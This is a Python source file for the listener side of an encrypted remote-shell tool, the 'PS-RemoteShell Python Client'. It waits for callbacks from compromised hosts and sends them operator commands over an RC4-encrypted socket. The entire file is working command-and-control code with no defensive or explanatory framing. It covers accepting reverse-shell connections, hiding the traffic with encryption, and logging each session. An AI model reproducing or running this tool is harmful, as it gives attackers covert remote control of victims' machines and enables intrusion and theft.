# PS-RemoteShell Python Client
# Author: Mr.Un1k0d3r RingZer0 Team
import sys
import socket
import time

version = "1.1"
buffer_size = 4096
recv_timeout = 0.2
logpath = time.strftime("%c") + ".log" 

def log_command(command, action, path):
	open(path, "a+").write("\n[%s] %s:\n--------------------------------------------\n%s\n\n" % (time.strftime("%c"), action, command))

def KSA(key):
    keylength = len(key)

    S = range(256)

    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % keylength]) % 256
        S[i], S[j] = S[j], S[i]

    return S

def PRGA(S):
    i = 0
    j = 0
    while True:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i] 

        K = S[(S[i] + S[j]) % 256]
        yield K


def RC4(plaintext, key):
	output = ""
	key = [ord(c) for c in key]
	S = KSA(key)
	keystream = PRGA(S)
	for c in plaintext:
		output = output + chr(ord(c) ^ keystream.next())
	return output

def recvall(conn, size):
	buffer = ""
	current_buffer_size = 4096
	while size > 0:
		if size < current_buffer_size:
			current_buffer_size = size;
		buffer += conn.recv(current_buffer_size)
		time.sleep(recv_timeout)
		size -= current_buffer_size
	return buffer

if __name__ == "__main__":
	print "PS-RemoteShell Python Client v%s\nMr.Un1k0d3r RingZer0 Team\n\n" % version
	if len(sys.argv) < 4:
		print "Usage: %s ip port key" % sys.argv[0]
		exit(0)
	
	ip = sys.argv[1]
	port = int(sys.argv[2])
	key = sys.argv[3]

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((ip, port))
	s.listen(1)
	
	print "[*] Waiting for a connection..."
	try:
		while True:
			conn, addr = s.accept()
			print "[+] Callback from %s:%d" % (addr[0], addr[1])
			log_command("Callback from %s:%d" % (addr[0], addr[1]), "New Connection", logpath)
			
			data = True
			while data:
				data = conn.recv(buffer_size)
				data = RC4(data, key)
				if data[:11] == "PACKETSIZE=":
					time.sleep(recv_timeout)
					data = recvall(conn, int(data[11:]))
					data = RC4(data, key)
				
				log_command(data, "Received", logpath)
				cmd = raw_input(data)
				if cmd == "":
					cmd = ";"
				
				log_command(cmd, "Sending", logpath)
				cmd = RC4(cmd, key)
				conn.send(cmd)
	except KeyboardInterrupt:
		s.close()
		exit(0)
